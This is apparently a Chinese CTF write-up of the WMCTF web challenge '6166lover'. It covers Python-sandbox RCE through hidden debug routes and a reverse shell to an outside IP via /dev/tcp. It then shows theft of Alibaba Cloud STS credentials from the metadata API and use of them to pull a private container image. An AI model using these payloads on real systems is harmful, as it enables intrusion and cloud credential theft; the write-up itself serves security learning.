<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python">[package]<br>name = <span class="hljs-string">"static-files"</span><br>version = <span class="hljs-string">"0.0.0"</span><br>workspace = <span class="hljs-string">"../"</span><br>edition = <span class="hljs-string">"2021"</span><br>publish = false<br><br>[dependencies]<br>rocket = <span class="hljs-string">"0.5.0-rc.2"</span><br>js-sandbox = <span class="hljs-string">"0.1.6"</span><br>cpython = <span class="hljs-string">"0.7.0"</span><br></code></pre></td></tr></tbody></table></figure>
<p>得到了包名 static-file<br>同时可以看出项目使用了 js-sandbox 和 cpython<br>访问 /static-files  可以下载题目文件</p>
<h4 id="代码审计">代码审计<a class="post-anchor" href="#代码审计"></a></h4><p>rust IDA反编译出的代码非常难看<br>所以优先使用rocket自带的debuglog 判断路由<br>阅读rocket代码 发现 loglevel 可以使用环境变量控制<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086125720-c02cbc1f-36bd-4751-8676-9590fc300d19.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=722&amp;id=KE0b1&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=902&amp;originWidth=1076&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=150216&amp;status=done&amp;style=none&amp;taskId=u41a8f2b0-d6ae-421a-b0d8-9a3320759e4&amp;title=&amp;width=860.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086125720-c02cbc1f-36bd-4751-8676-9590fc300d19.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=722&amp;id=KE0b1&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=902&amp;originWidth=1076&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=150216&amp;status=done&amp;style=none&amp;taskId=u41a8f2b0-d6ae-421a-b0d8-9a3320759e4&amp;title=&amp;width=860.8" alt="图片.png"></a><br>添加环境变量运行 发现有4条路由<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086193304-d5de93e0-f8dc-4d29-8646-306faf76c453.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=291&amp;id=ZeaIM&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=364&amp;originWidth=582&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=89953&amp;status=done&amp;style=none&amp;taskId=u58ae5205-5227-45d2-88a2-1d8d6294209&amp;title=&amp;width=465.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086193304-d5de93e0-f8dc-4d29-8646-306faf76c453.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=291&amp;id=ZeaIM&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=364&amp;originWidth=582&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=89953&amp;status=done&amp;style=none&amp;taskId=u58ae5205-5227-45d2-88a2-1d8d6294209&amp;title=&amp;width=465.6" alt="图片.png"></a><br>  (first) GET /<br>(second) GET /&lt;path..&gt;<br>  (test2) GET /debug/wnihwi2h2i2j1no1_path_wj2mm? &lt; code &gt;<br>  (test) GET /debug/3wj2io2j2nlwnmkwwkowjwojw_path_eee? &lt; code &gt;</p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086263375-82e1d974-ceee-47aa-a78a-11cbda34a249.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=824&amp;id=gKbSR&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=1030&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=177387&amp;status=done&amp;style=none&amp;taskId=udd9e660e-cf55-4311-b059-d06faf032a1&amp;title=&amp;width=1536" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086263375-82e1d974-ceee-47aa-a78a-11cbda34a249.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=824&amp;id=gKbSR&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=1030&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=177387&amp;status=done&amp;style=none&amp;taskId=udd9e660e-cf55-4311-b059-d06faf032a1&amp;title=&amp;width=1536" alt="图片.png"></a>结合IDA反编译 不难看出 两个test路由<br>一个调用了js沙箱<br>一个调用了cython</p>
<h4 id="cpython简单的沙箱逃逸">cpython简单的沙箱逃逸<a class="post-anchor" href="#cpython简单的沙箱逃逸"></a></h4><p>显然cpython rce可能性更大些<br>项目中没有导入其他python库<br>也不能直接使用import<br>访问<br>/debug/wnihwi2h2i2j1no1_path_wj2mm?code=print(dir(<strong>builtins</strong>))<br>查看可以使用的函数<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086519908-4d72ef5e-f844-4f36-a6ab-135ca043c8c1.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=402&amp;id=oPehW&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=502&amp;originWidth=646&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=149983&amp;status=done&amp;style=none&amp;taskId=u3033cbe5-e45b-414b-9e17-bd0304a7c70&amp;title=&amp;width=516.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086519908-4d72ef5e-f844-4f36-a6ab-135ca043c8c1.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=402&amp;id=oPehW&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=502&amp;originWidth=646&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=149983&amp;status=done&amp;style=none&amp;taskId=u3033cbe5-e45b-414b-9e17-bd0304a7c70&amp;title=&amp;width=516.8" alt="图片.png"></a><br>发现可以使用exec和__import__<br>/debug/wnihwi2h2i2j1no1_path_wj2mm?code=print(exec(%22__import__(%27os%27).system(%27echo%20YmFzXXXXXXXXXXXXXXXXXPiYx%7Cbase64%20%2Dd%7Cbash%27)%22))<br>直接尝试反弹shell<br>成功rce<br>过了一段时间被kill  使用 nohup &amp; fork 一个新进程 解决<br>之后exit结束当前进程</p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086652018-bb654cca-964d-4a9c-8c02-b464449a1ffb.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=270&amp;id=wovgu&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=338&amp;originWidth=864&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=36794&amp;status=done&amp;style=none&amp;taskId=uaf6b44db-60c6-47cb-bfea-d043d3fd69e&amp;title=&amp;width=691.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086652018-bb654cca-964d-4a9c-8c02-b464449a1ffb.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=270&amp;id=wovgu&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=338&amp;originWidth=864&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=36794&amp;status=done&amp;style=none&amp;taskId=uaf6b44db-60c6-47cb-bfea-d043d3fd69e&amp;title=&amp;width=691.2" alt="图片.png"></a><br>找了半天哪里都找不到flag)<br>最后ps 发现启动时rm了flag</p>
<h4 id="数据恢复"><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086612841-35576b61-38ab-426c-bbd1-72fa6c88c72f.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=196&amp;id=NKPCw&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=245&amp;originWidth=1320&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=25336&amp;status=done&amp;style=none&amp;taskId=uaf300d1e-b48b-4264-a0c8-fbbab50b786&amp;title=&amp;width=1056" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661086612841-35576b61-38ab-426c-bbd1-72fa6c88c72f.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=196&amp;id=NKPCw&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=245&amp;originWidth=1320&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=25336&amp;status=done&amp;style=none&amp;taskId=uaf300d1e-b48b-4264-a0c8-fbbab50b786&amp;title=&amp;width=1056" alt="图片.png"></a>数据恢复?<a class="post-anchor" href="#数据恢复"></a></h4><p>首先我想到了rm删除的文件没有覆盖时可以从硬盘中直接读取<br>这里只需要简单使用grep匹配字符串就可以<br>构造命令行</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python">dd <span class="hljs-keyword">if</span>=/dev/sda1|grep -o -m <span class="hljs-number">1</span> -a -E <span class="hljs-string">'(WMCTF)\{.*\}'</span><br></code></pre></td></tr></tbody></table></figure>
<p>本地测试成功<br>到了远程测试发现失败<br>明明df 中存在的目录 为什么会无法访问)</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python">ls -ll /dev/<br>total <span class="hljs-number">0</span><br>lrwxrwxrwx 1 root root   11 Aug 21 11:39 core -&gt; /proc/kcore<br>lrwxrwxrwx 1 root root   13 Aug 21 11:39 fd -&gt; /proc/self/fd<br>crw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">1</span>, <span class="hljs-number">7</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> full<br>drwxrwxrwt <span class="hljs-number">2</span> root root   <span class="hljs-number">40</span> Aug <span class="hljs-number">19</span> <span class="hljs-number">18</span>:<span class="hljs-number">39</span> mqueue<br>crw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">1</span>, <span class="hljs-number">3</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> null<br>lrwxrwxrwx 1 root root    8 Aug 21 11:39 ptmx -&gt; pts/ptmx<br>drwxr-xr-x <span class="hljs-number">2</span> root root    <span class="hljs-number">0</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> pts<br>crw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">1</span>, <span class="hljs-number">8</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> random<br>drwxrwxrwt <span class="hljs-number">2</span> root root   <span class="hljs-number">40</span> Aug <span class="hljs-number">19</span> <span class="hljs-number">18</span>:<span class="hljs-number">39</span> shm<br>lrwxrwxrwx 1 root root   15 Aug 21 11:39 stderr -&gt; /proc/self/fd/2<br>lrwxrwxrwx 1 root root   15 Aug 21 11:39 stdin -&gt; /proc/self/fd/0<br>lrwxrwxrwx 1 root root   15 Aug 21 11:39 stdout -&gt; /proc/self/fd/1<br>-rw-rw-rw- <span class="hljs-number">1</span> root root    <span class="hljs-number">0</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> termination-log<br>crw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">5</span>, <span class="hljs-number">0</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> tty<br>crw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">1</span>, <span class="hljs-number">9</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> urandom<br>crw-rw-rw- <span class="hljs-number">1</span> root root <span class="hljs-number">1</span>, <span class="hljs-number">5</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span> zero<br></code></pre></td></tr></tbody></table></figure>
<p>之前光在本地测试 之后才反应过来这原来是个容器环境)<br>那么恢复文件的方法只可能是拿到容器镜像了</p>
<h4 id="k8s-容器逃逸">k8s 容器逃逸<a class="post-anchor" href="#k8s-容器逃逸"></a></h4><p>用于没有k8s逃逸经验 这里我直接拿出了CDK 工具自动检测<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087245383-ae856803-6d8d-47e2-80a8-f8052669aa5e.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=242&amp;id=ZwM9t&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=303&amp;originWidth=1048&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=40443&amp;status=done&amp;style=none&amp;taskId=ue4050b82-4651-4d71-a1c6-465eb9eecd9&amp;title=&amp;width=838.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087245383-ae856803-6d8d-47e2-80a8-f8052669aa5e.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=242&amp;id=ZwM9t&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=303&amp;originWidth=1048&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=40443&amp;status=done&amp;style=none&amp;taskId=ue4050b82-4651-4d71-a1c6-465eb9eecd9&amp;title=&amp;width=838.4" alt="图片.png"></a><br>发现可以访问到阿里云的metadata api<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087315893-08ebd5f8-3b2e-485d-81c7-bd109f48bcc1.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=435&amp;id=CRp5U&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=544&amp;originWidth=1456&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=73436&amp;status=done&amp;style=none&amp;taskId=uc71d0547-34b1-4581-b9cf-95c1468c9d9&amp;title=&amp;width=1164.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087315893-08ebd5f8-3b2e-485d-81c7-bd109f48bcc1.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=435&amp;id=CRp5U&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=544&amp;originWidth=1456&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=73436&amp;status=done&amp;style=none&amp;taskId=uc71d0547-34b1-4581-b9cf-95c1468c9d9&amp;title=&amp;width=1164.8" alt="图片.png"></a><br>拿到了一个 角色为KubernetesWorkerRole的StS 临时令牌<br>经过一下午的测试 发现这个令牌的权限非常小 这是个阿里云<a target="_blank" rel="noopener" href="https://help.aliyun.com/product/85222.html">容器服务 ACK</a>容器内的key<br>得到的稍微有价值的信息  只有通过api读取的ecs实例列表<br>并不能进行修改操作 猜测应该要拉取题目镜像 getflag 但是在题目给出的阿里云国际版文档并没有找到api<br>只进行到这里了 x)</p>
<hr>
<p>在官方解放出来后成功复现了题目</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python">WEB-6166lover:<br><span class="hljs-number">1.</span> Figure out that <span class="hljs-keyword">is</span> a Rocket application <span class="hljs-keyword">and</span> has Cargo.tml leaked.<br><span class="hljs-number">2.</span> Download it <span class="hljs-keyword">and</span> find the application name <span class="hljs-string">"static-files"</span> <span class="hljs-keyword">and</span> download the binary.<br><span class="hljs-number">3.</span> Run it <span class="hljs-keyword">with</span> debug mode <span class="hljs-keyword">or</span> Write a example application by yourself to find out the route has been registered.<br><span class="hljs-number">4.</span> Figure out both of the debug route have done, one <span class="hljs-keyword">is</span> js sandbox, the another one <span class="hljs-keyword">is</span> python <span class="hljs-string">"sandbox"</span>. Just think them <span class="hljs-keyword">as</span> a black box <span class="hljs-keyword">and</span> test them.<br><span class="hljs-number">5.</span> Run python code to RCE.<br><span class="hljs-number">6.</span> ps -ef, You will find /flag has been deleted when the instance booted.<br><span class="hljs-number">7.</span> Use Alibabacloud metadata to get the host instance metadata, And a worker role on it. https://<span class="hljs-built_in">help</span>.aliyun.com/document_detail/<span class="hljs-number">214777.</span>html / /meta-data/ram/security-credentials/<br><br><span class="hljs-number">8.</span> Use metadata api to get the temp credentials. <br><span class="hljs-number">9.</span> Use temp credentials to invoke api GetAuthorizationToken. https://<span class="hljs-built_in">help</span>.aliyun.com/document_detail/<span class="hljs-number">72334.</span>html<br><span class="hljs-number">10.</span> Pull image <span class="hljs-keyword">from</span> alibabacloud image registry <span class="hljs-keyword">with</span> username cr_temp_user  <span class="hljs-keyword">and</span> authorizationToken <span class="hljs-keyword">as</span> its password.<br>Image: registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover<br><br>You may know these <span class="hljs-keyword">from</span> the challenge domain, I have deployed <span class="hljs-keyword">in</span> hangzhou of alibabacloud k8s service(ACK). And know the author name <span class="hljs-keyword">is</span> glzjin, <span class="hljs-keyword">and</span> the challenge name 6166lover.<br><span class="hljs-number">11.</span> After pull it, just run it <span class="hljs-keyword">with</span> docker run -it registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover bash, <span class="hljs-keyword">and</span> you may get the flag on the image.<br><br>Thank you:)<br>Just get your reverse shell like that:<br>http://6166lover.cf8a086c34bdb47138be0b5d5b15b067a.cn-hangzhou.alicontainer.com:81/debug/wnihwi2h2i2j1no1_path_wj2mm?code=__import__('os').system('bash -c "bash -i &gt;%26 /dev/tcp/137.220.194.119/2233 0&gt;%261"')<br><br>And maybe you have to find out a way to fork your process that <span class="hljs-keyword">not</span> jam this application because it<span class="hljs-string">'s deployed on k8s with a health check.</span><br></code></pre></td></tr></tbody></table></figure>
<p>使用拿到的token调用GetAuthorizationToken api 获取阿里云镜像仓库的临时凭证<br><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/72334.html">https://help.aliyun.com/document_detail/72334.html</a></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><br><span class="hljs-keyword">from</span> aliyunsdkcore.client <span class="hljs-keyword">import</span> AcsClient<br><span class="hljs-keyword">from</span> aliyunsdkcore.request <span class="hljs-keyword">import</span> CommonRequest<br><span class="hljs-keyword">from</span> aliyunsdkcore.auth.credentials <span class="hljs-keyword">import</span> AccessKeyCredential<br><span class="hljs-keyword">from</span> aliyunsdkcore.auth.credentials <span class="hljs-keyword">import</span> StsTokenCredential<br><br>credentials = StsTokenCredential(<span class="hljs-string">'&lt;your-access-key-id&gt;'</span>, <span class="hljs-string">'&lt;your-access-key-secret&gt;'</span>, <span class="hljs-string">'&lt;your-sts-token&gt;'</span>)<br>client = AcsClient(region_id=<span class="hljs-string">'cn-hangzhou'</span>, credential=credentials)<br><br>request = CommonRequest()<br>request.set_accept_format(<span class="hljs-string">'json'</span>)<br>request.set_method(<span class="hljs-string">'GET'</span>)<br>request.set_protocol_type(<span class="hljs-string">'https'</span>) <span class="hljs-comment"># https | http</span><br>request.set_domain(<span class="hljs-string">'cr.cn-hangzhou.aliyuncs.com'</span>)<br>request.set_version(<span class="hljs-string">'2016-06-07'</span>)<br><br>request.add_header(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'application/json'</span>)<br>request.set_uri_pattern(<span class="hljs-string">'/tokens'</span>)<br><br><br>response = client.do_action_with_exception(request)<br><br><span class="hljs-comment"># python2:  print(response) </span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(response, encoding = <span class="hljs-string">'utf-8'</span>))<br></code></pre></td></tr></tbody></table></figure>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137565404-22b850c2-14a5-43d6-9314-6010e0355263.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=211&amp;id=ua8a5f88f&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=264&amp;originWidth=935&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=39512&amp;status=done&amp;style=none&amp;taskId=u18048dac-8c2b-4d3e-9f1f-8457e54519c&amp;title=&amp;width=748" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137565404-22b850c2-14a5-43d6-9314-6010e0355263.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=211&amp;id=ua8a5f88f&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=264&amp;originWidth=935&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=39512&amp;status=done&amp;style=none&amp;taskId=u18048dac-8c2b-4d3e-9f1f-8457e54519c&amp;title=&amp;width=748" alt="图片.png"></a><br>使用凭证登陆仓库<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137686879-719a2030-5928-41e0-8f04-322a5096411b.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=194&amp;id=u2b0fd9db&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=242&amp;originWidth=904&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23509&amp;status=done&amp;style=none&amp;taskId=udcbb87bf-2fa9-4a77-a93a-02220974a36&amp;title=&amp;width=723.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137686879-719a2030-5928-41e0-8f04-322a5096411b.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=194&amp;id=u2b0fd9db&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=242&amp;originWidth=904&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23509&amp;status=done&amp;style=none&amp;taskId=udcbb87bf-2fa9-4a77-a93a-02220974a36&amp;title=&amp;width=723.2" alt="图片.png"></a><br> pull 题目镜像<br>ps:题目镜像仓库名和镜像名可以利用 内网的metrics监控查看到  也可以根据作者和题目名猜测<br>curl 172.20.240.9:8080/metrics<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661138105114-689c7fdb-ef63-4c33-9dff-d7cce3efbfb2.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=482&amp;id=u3a804474&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=602&amp;originWidth=1619&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=173021&amp;status=done&amp;style=none&amp;taskId=ubcf3baeb-7ff3-4d7b-8b2c-a7180f7ab03&amp;title=&amp;width=1295.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661138105114-689c7fdb-ef63-4c33-9dff-d7cce3efbfb2.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=482&amp;id=u3a804474&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=602&amp;originWidth=1619&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=173021&amp;status=done&amp;style=none&amp;taskId=ubcf3baeb-7ff3-4d7b-8b2c-a7180f7ab03&amp;title=&amp;width=1295.2" alt="图片.png"></a><br> registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137754481-d44630f1-723e-482f-acb7-80fd994f73c8.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=147&amp;id=u9390aafd&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=184&amp;originWidth=1226&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=24822&amp;status=done&amp;style=none&amp;taskId=ua73866ef-d357-4db0-bc86-25736cc437c&amp;title=&amp;width=980.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137754481-d44630f1-723e-482f-acb7-80fd994f73c8.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=147&amp;id=u9390aafd&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=184&amp;originWidth=1226&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=24822&amp;status=done&amp;style=none&amp;taskId=ua73866ef-d357-4db0-bc86-25736cc437c&amp;title=&amp;width=980.8" alt="图片.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137895201-0cef6a07-8903-4289-aa0f-d1e566d61c65.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=85&amp;id=ua875a877&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=106&amp;originWidth=978&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16188&amp;status=done&amp;style=none&amp;taskId=uca9a6bbf-7c42-4f1c-b5a9-a574a63d279&amp;title=&amp;width=782.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661137895201-0cef6a07-8903-4289-aa0f-d1e566d61c65.png#clientId=u714e1d8e-ea5e-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=85&amp;id=ua875a877&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=106&amp;originWidth=978&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16188&amp;status=done&amp;style=none&amp;taskId=uca9a6bbf-7c42-4f1c-b5a9-a574a63d279&amp;title=&amp;width=782.4" alt="图片.png"></a></p>
<h1 id="PWN">PWN<a class="post-anchor" href="#PWN"></a></h1><h2 id="Ubuntu">Ubuntu<a class="post-anchor" href="#Ubuntu"></a></h2><p>出题人失误,忘记修改题目flag<br>直接使用镜像内flag<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1661087656182-e995cef2-5ad0-4f1a-97c4-80c88fa9a329.png#clientId=u7260ff72-5b80-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=554&amp;id=u78e364e2&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=693&amp;originWidth=947&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=60990&amp;status=done&amp;style=none&amp;taskId=uf0b131d7-2eae-4c27-b090-652e18c2778&amp;title=&amp;width=757.6" data-caption="图片.png" data-fancybox="images"><img 